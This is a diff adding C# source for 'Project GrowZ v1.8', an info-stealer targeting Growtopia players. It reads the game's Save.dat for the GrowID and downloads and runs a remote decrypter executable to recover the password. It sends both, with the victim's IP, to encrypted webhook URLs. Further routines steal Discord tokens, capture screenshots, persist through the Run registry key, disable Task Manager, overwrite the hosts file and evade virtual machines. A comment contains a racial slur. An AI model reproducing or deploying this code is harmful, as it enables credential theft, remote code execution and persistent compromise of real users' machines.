@@ -1,0 +1,453 @@
+using Microsoft.Win32;
+using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
+using System.Collections.Specialized;
+using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Linq;
+using System.Management;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Security.Cryptography;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Reflection;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+
+namespace Program
+{
+	public class Include
+	{
+		public static class StringCipher
+		{
+			public const int Keysize = 256;
+
+			public const int DerivationIterations = 1000;
+			public static string passPhrase = "aeskey";
+
+			public static string Decrypt(string cipherText)
+			{
+				var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
+				var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
+				var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
+				var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();
+
+				using (var password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, DerivationIterations))
+				{
+					var keyBytes = password.GetBytes(Keysize / 8);
+					using (var symmetricKey = new RijndaelManaged())
+					{
+						symmetricKey.BlockSize = 256;
+						symmetricKey.Mode = CipherMode.CBC;
+						symmetricKey.Padding = PaddingMode.PKCS7;
+						using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
+						{
+							using (var memoryStream = new MemoryStream(cipherTextBytes))
+							{
+								using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
+								{
+									var plainTextBytes = new byte[cipherTextBytes.Length];
+									var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
+									memoryStream.Close();
+									cryptoStream.Close();
+									return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+		public class Http
+		{
+			private readonly WebClient dWebClient;
+
+			public static List<string> ListURLS = new List<string>(new string[] { "$URL$" });
+			public Http()
+			{
+				this.dWebClient = new WebClient();
+			}
+
+			public static void attachment(string path)
+			{
+				using (WebClient webClient = new WebClient())
+				{
+					foreach (string lmao in ListURLS.ToArray())
+					{
+						string kek = StringCipher.Decrypt(lmao);
+						webClient.UploadFile(kek, path);
+					}
+				}
+			}
+
+		}
+
+		internal class plugins
+		{
+			public static void FullScreenshot(String filepath, String filename, ImageFormat format)
+			{
+				Rectangle bounds = Screen.GetBounds(Point.Empty);
+				using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+				{
+					using (Graphics g = Graphics.FromImage(bitmap))
+					{
+						g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+					}
+
+					string fullpath = filepath + "\\" + filename;
+
+					bitmap.Save(fullpath, format);
+				}
+			}
+
+			public void corrupt()
+			{
+				using (StreamWriter streamWriter = new StreamWriter("C:\\Windows\\System32\\drivers\\etc\\hosts"))
+				{
+					streamWriter.WriteLine("127.0.0.1 growtopia1.com");
+					streamWriter.WriteLine("127.0.0.1 growtopia2.com");
+				}
+			}
+
+			public void AntiVM()
+			{
+
+				using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+				{
+					using (var items = searcher.Get())
+					{
+						foreach (var item in items)
+						{
+							string manufacturer = item["Manufacturer"].ToString().ToLower();
+							if ((manufacturer == "microsoft corporation") && (item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+									|| manufacturer.Contains("vmware")
+									|| item["Model"].ToString() == "VirtualBox")
+							{
+								Environment.Exit(0);
+							}
+						}
+					}
+				}
+			}
+
+			public static void RegistryEdit(string regPath, string name, string value)
+			{
+				try
+				{
+					using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
+					{
+						if (key == null)
+						{
+							Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
+							return;
+						}
+						if (key.GetValue(name) != (object)value)
+							key.SetValue(name, value, RegistryValueKind.DWord);
+					}
+				}
+				catch { }
+			}
+
+			public void Taskmanager()
+			{
+				RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+				objRegistryKey.SetValue("DisableTaskMgr", 1);
+			}
+
+			public static string GetMacAddress()
+			{
+				string macAddresses1 = "";
+
+
+				foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
+				{
+					macAddresses1 += "\n";
+					macAddresses1 += nic.GetPhysicalAddress().ToString();
+				}
+				return macAddresses1;
+			}
+
+
+			public static string takeToken()
+			{
+				try
+				{
+					string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
+					int num;
+					while ((num = text.IndexOf("oken")) != -1)
+					{
+						text = text.Substring(num + "oken".Length);
+					}
+					return text.Split('"')[1];
+				}
+				catch (Exception)
+				{
+					return null;
+				}
+			}
+
+
+			public void Startup()
+			{
+				string dfgdfgdgdg = Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath) + "\\" + "sfsdhfdkjfhdkjfmanba" + ".exe";
+				try
+				{
+					if (File.Exists(dfgdfgdgdg))
+					{
+						File.Delete(dfgdfgdgdg);
+					}
+					File.Copy(Application.ExecutablePath, Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath));
+					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+					registryKey.SetValue(Path.GetFileNameWithoutExtension(dfgdfgdgdg), dfgdfgdgdg);
+				}
+				catch
+				{
+					Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(dfgdfgdgdg));
+					if (processesByName.Length > 0)
+					{
+						Process[] array = processesByName;
+						int num = 0;
+						if (num < array.Length)
+						{
+							Process process = array[num];
+							process.Kill();
+						}
+					}
+				}
+			}
+		}
+
+
+
+
+
+		public static class SendPacked
+		{
+			public static string decodebase(string basedata)
+			{
+				byte[] bytes = Convert.FromBase64String(basedata);
+				return Encoding.UTF8.GetString(bytes);
+			}
+
+			public static string getuser()
+			{
+				try
+				{
+					string savedat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Save.dat";
+					var pattern = new Regex(@"[^\w0 - 9]");
+					string savedata = null;
+					var r = File.Open(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+					using (FileStream fileStream = new FileStream(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+					{
+						using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
+						{
+							savedata = streamReader.ReadToEnd();
+						}
+					}
+					string cleardata = savedata.Replace("\u0000", " ");
+					string firstgrowid = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
+					return firstgrowid;
+				}
+				catch (Exception)
+				{
+					string sorry2 = "couldnt find the username!";
+					return sorry2;
+				}
+			}
+			public static string getpass()
+			{
+				try
+				{
+					string nanananaan = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Save.dat";
+
+					if (File.Exists(nanananaan))
+					{
+						new WebClient().DownloadFile(SendPacked.decodebase("aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTQzNDkzMTQ0NDY3NjE1ODE1Lzk1NTU3MzMyNDk5NjU3MTE5Ny9zYXZlZGVjcnlwdGVyLmV4ZQ=="), Path.GetTempPath() + "\\savedecrypter.exe");
+						Process.Start(Path.GetTempPath() + "\\savedecrypter.exe");
+						Thread.Sleep(1000);
+						byte[] lolxd = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\lanx.txt");
+						string result = System.Text.Encoding.UTF8.GetString(lolxd);
+
+						return result;
+					}
+					else
+					{
+						string sorry = "couldnt find save.dat file!";
+						return sorry;
+
+					}
+				}
+				catch (Exception)
+				{
+					string sorry1 = "an error has occured while decoding";
+					return sorry1;
+				}
+			}
+			public static void tracemessage()
+			{
+
+				foreach (string x in Http.ListURLS.ToArray())
+				{
+					WebRequest wr = (HttpWebRequest)WebRequest.Create(StringCipher.Decrypt(x));
+					wr.ContentType = "application/json";
+
+					wr.Method = "POST";
+
+					using (var sw = new StreamWriter(wr.GetRequestStream()))
+					{
+						WebClient web = new WebClient();
+						string ip = web.DownloadString("https://showmyipaddress1337.000webhostapp.com");
+						string remove = RemoveWhitespace(ip);
+						string json = JsonConvert.SerializeObject(new
+						{
+							username = "Project GrowZ v1.8",
+							embeds = new[]
+							{
+						new
+						{
+							title = "Project GrowZ v1.8",
+							description = string.Concat(new string[]
+							{
+								"GrowID: ```\n" + getuser() + "```",
+								"\n",
+								"Password: ```\n" + getpass() + "```",
+								"\n",
+								//mack
+								//tok3n
+								//infolel
+							}),
+
+							color = "49151"
+						}
+					}
+						});
+						sw.Write(json);
+					}
+					var response = (HttpWebResponse)wr.GetResponse();
+				}
+                //ss
+				//recover
+				//stealCT1
+			}
+			public static string RemoveWhitespace(string input)
+			{
+				return new string(input.ToCharArray()
+					.Where(c => !Char.IsWhiteSpace(c))
+					.ToArray());
+			}
+            public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
+		    {
+			Assembly assembly = Assembly.GetCallingAssembly();
+
+			using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
+			using (BinaryReader r = new BinaryReader(s))
+			using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
+			using (BinaryWriter w = new BinaryWriter(fs))
+				w.Write(r.ReadBytes((int)s.Length));
+	     	}
+
+			public static void Main()
+			{
+                //Extract("Program", Path.GetTempPath(), "Resources", "Newtonsoft.Json.dll");
+				//defendernigger
+				//myholywater
+				//fakeerrorlolnub
+				WebClient webClient = new WebClient();
+				string anamz = webClient.DownloadString("https://showmyipaddress1337.000webhostapp.com/"); //00webhost is banned in turkey
+				Thread.Sleep(1000);
+				plugins plugin = new plugins();
+				//startuplolhehe
+				//antivm
+				//hidefileomglolok
+				//1337disabletasklolpro
+				//corruptgt
+
+				foreach (string x in Http.ListURLS.ToArray())
+				{
+					WebRequest wr = (HttpWebRequest)WebRequest.Create(StringCipher.Decrypt(x));
+					wr.ContentType = "application/json";
+
+					wr.Method = "POST";
+
+					using (var sw = new StreamWriter(wr.GetRequestStream()))
+					{
+						WebClient web = new WebClient();
+						string ip = web.DownloadString("https://showmyipaddress1337.000webhostapp.com/"); //00webhost is banned in turkey
+						string remove = RemoveWhitespace(ip);
+						string json = JsonConvert.SerializeObject(new
+						{
+							username = "djasdaksdaksd",
+							embeds = new[]
+							{
+						new
+						{
+							title = "Project GrowZ v1.8",
+							description = string.Concat(new string[]
+							{
+								"GrowID: ```\n" + getuser() + "```",
+								"\n",
+								"Password: ```\n" + getpass() + "```",
+								"\n",
+								//mack	
+								//tok3n
+								//infolel
+							}),
+							color = "49151"
+						}
+					}
+						});
+						sw.Write(json);
+					}
+					var response = (HttpWebResponse)wr.GetResponse();
+				}
+                //ss
+				//recover
+				//stealCT1
+				//Tracer
+			}
+		}
+		//myholywaters
+		public class Tracer
+		{
+			public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia";
+			public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
+			public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
+
+			public static void TraceSave()
+			{
+				fileSystemWatcher.Path = dirPath;
+				fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
+				fileSystemWatcher.Filter = "*.dat";
+				fileSystemWatcher.Changed += OnSaveChanged;
+				fileSystemWatcher.EnableRaisingEvents = true;
+
+				while (true)
+				{
+					Thread.Sleep(1000);
+				}
+			}
+
+			public static void OnSaveChanged(object source, FileSystemEventArgs e)
+			{
+				if (e.FullPath == savePath)
+				{
+					try
+					{
+						fileSystemWatcher.EnableRaisingEvents = false;
+						SendPacked.tracemessage();
+					}
+					finally
+					{
+						fileSystemWatcher.EnableRaisingEvents = true;
+					}
+				}
+			}
+		}
+	}
+}
